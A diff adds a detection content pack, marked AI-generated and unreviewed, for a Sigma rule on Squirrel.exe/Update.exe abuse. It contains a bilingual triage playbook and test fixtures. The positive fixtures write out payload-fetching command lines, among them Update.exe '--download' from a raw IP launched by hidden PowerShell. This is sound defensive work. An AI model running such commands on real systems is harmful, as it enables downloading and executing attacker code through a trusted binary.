@@ -1,0 +1,128 @@
+{
+  "rule": {
+    "id": "1e75c1cc-c5d4-42aa-ac3d-91b0b68b3b4c",
+    "title": "Arbitrary File Download Via Squirrel.EXE",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems), Karneades / Markus Neis, Jonhnathan Ribeiro, oscd.community",
+    "path": "windows/process_creation/proc_creation_win_squirrel_download.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_squirrel_download.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó Squirrel.exe o Update.exe, el actualizador de aplicaciones Electron, con una opción de descarga o actualización (--download, --update, --updateRollback=) que apunta a una URL. Puede ser una actualización legítima o el uso de este LOLBin para descargar y ejecutar payloads.",
+      "what_it_detects": "Eventos de creación de procesos en Windows donde Image termina en \\squirrel.exe o \\update.exe y CommandLine contiene ' --download ', ' --update ' o ' --updateRollback=' junto con 'http'.",
+      "why_it_matters": "Squirrel viene incluido en muchas aplicaciones Electron (Slack, Teams, Discord) y tiene firma de confianza. Un atacante puede usarlo para descargar y ejecutar paquetes remotos y evadir controles, lo que corresponde a ejecución por proxy mediante binarios del sistema (T1218).",
+      "triage_steps": [
+        "Revisar CommandLine y extraer la URL: ¿el dominio pertenece al proveedor real de la aplicación o es una IP, un dominio recién registrado o un servicio de hosting de archivos?",
+        "Validar la ruta de Image: debe estar dentro de %LocalAppData%\\<App>\\ de una aplicación instalada; las rutas en Temp, Downloads o Public son sospechosas.",
+        "Verificar el hash y la firma digital de squirrel.exe/update.exe y compararlos con los de la versión oficial de la aplicación.",
+        "Analizar ParentImage: lo normal es la propia aplicación Electron; cmd.exe, powershell.exe, wscript.exe o Office indican abuso.",
+        "Pivotar en el mismo host +/- 15 minutos: procesos hijos de Update.exe, archivos .nupkg o ejecutables nuevos y conexiones de red hacia el dominio de la URL.",
+        "Revisar el usuario, si la aplicación está autorizada en el equipo y alertas previas para el mismo host, usuario o URL."
+      ],
+      "false_positives": [
+        "Actualizaciones legítimas de aplicaciones Electron como Discord, Slack, Teams, GitHub Desktop, 1Clipboard o Caret hacia los servidores del proveedor.",
+        "Despliegues o reparaciones de software realizados por TI que invocan Update.exe con un servidor de actualizaciones interno."
+      ],
+      "response_steps": [
+        "Confirmar con el usuario o con TI si la actualización era esperada y si la URL corresponde al proveedor legítimo.",
+        "Si se confirma el abuso, aislar el endpoint y bloquear la URL, el dominio y la IP en el proxy y el firewall.",
+        "Recuperar y analizar en sandbox los paquetes descargados y los binarios ejecutados; buscar sus hash en el resto de la flota.",
+        "Eliminar los artefactos maliciosos y los mecanismos de persistencia después de verificarlos, restablecer las credenciales expuestas y documentar los IOC."
+      ],
+      "severity_rationale": "Un nivel medium es adecuado porque esta técnica permite la descarga y ejecución con un binario de confianza, pero las actualizaciones legítimas de Electron generan falsos positivos frecuentes."
+    },
+    "en": {
+      "summary": "Squirrel.exe or Update.exe, the Electron app updater, ran with a download or update option (--download, --update, --updateRollback=) pointing to a URL. This may be a legitimate update or abuse of this LOLBin to fetch and run payloads.",
+      "what_it_detects": "Windows process creation events where Image ends with \\squirrel.exe or \\update.exe and CommandLine contains ' --download ', ' --update ' or ' --updateRollback=' plus 'http'.",
+      "why_it_matters": "Squirrel ships with many Electron apps (Slack, Teams, Discord) and is trusted and signed. Attackers can use it to download and run remote packages while evading controls. This is system binary proxy execution (T1218).",
+      "triage_steps": [
+        "Read CommandLine and extract the URL. Check whether the domain belongs to the app's real vendor, or whether it is a raw IP, a newly registered domain or a file-hosting service.",
+        "Check the Image path. It should sit under %LocalAppData%\\<App>\\ for an installed app. Paths in Temp, Downloads or Public are suspicious.",
+        "Check the hash and signature of squirrel.exe/update.exe and compare them with the official app release.",
+        "Review ParentImage. The Electron app itself is expected. cmd.exe, powershell.exe, wscript.exe or Office processes point to abuse.",
+        "Pivot on the same host +/- 15 minutes: child processes of Update.exe, new .nupkg or executable files, and network connections to the URL's domain.",
+        "Review the user, whether the app is approved on this host, and earlier alerts for the same host, user or URL."
+      ],
+      "false_positives": [
+        "Legitimate updates of Electron apps such as Discord, Slack, Teams, GitHub Desktop, 1Clipboard or Caret from vendor servers.",
+        "IT software deployments or repairs that call Update.exe against an internal update server."
+      ],
+      "response_steps": [
+        "Confirm with the user or IT that the update was expected and that the URL belongs to the vendor.",
+        "If abuse is confirmed, isolate the endpoint and block the URL, domain and IP at the proxy and firewall.",
+        "Collect the downloaded packages and executed binaries and analyze them in a sandbox. Hunt for their hashes across the fleet.",
+        "After verification, remove malicious artifacts and persistence, reset exposed credentials and document IOCs."
+      ],
+      "severity_rationale": "Medium fits because the technique lets an attacker download and run code through a trusted binary, but legitimate Electron updates cause frequent false positives."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Update.exe inside a Discord folder downloads a package from a raw IP, launched by PowerShell",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Users\\jperez\\AppData\\Local\\Discord\\Update.exe",
+          "CommandLine": "\"C:\\Users\\jperez\\AppData\\Local\\Discord\\Update.exe\" --download http://203.0.113.45/pkg/",
+          "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentCommandLine": "powershell.exe -nop -w hidden",
+          "CurrentDirectory": "C:\\Users\\jperez\\AppData\\Local\\Temp\\"
+        }
+      },
+      {
+        "description": "Squirrel.exe copied to a Temp folder runs --update against an external HTTPS server",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Users\\mrojas\\AppData\\Local\\Temp\\upd\\squirrel.exe",
+          "CommandLine": "squirrel.exe --update https://files.example.org/releases/",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c start squirrel.exe",
+          "CurrentDirectory": "C:\\Users\\mrojas\\AppData\\Local\\Temp\\upd\\"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Normal Discord startup via Update.exe --processStart, with no download option and no URL",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Users\\jperez\\AppData\\Local\\Discord\\Update.exe",
+          "CommandLine": "\"C:\\Users\\jperez\\AppData\\Local\\Discord\\Update.exe\" --processStart Discord.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CurrentDirectory": "C:\\Users\\jperez\\AppData\\Local\\Discord\\"
+        }
+      },
+      {
+        "description": "Update.exe --update from a local file path with no http in the command line",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0311.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Users\\lgomez\\AppData\\Local\\GitHubDesktop\\Update.exe",
+          "CommandLine": "\"C:\\Users\\lgomez\\AppData\\Local\\GitHubDesktop\\Update.exe\" --update C:\\Deploy\\GitHubDesktop\\packages",
+          "ParentImage": "C:\\Windows\\System32\\msiexec.exe",
+          "CurrentDirectory": "C:\\Users\\lgomez\\AppData\\Local\\GitHubDesktop\\"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
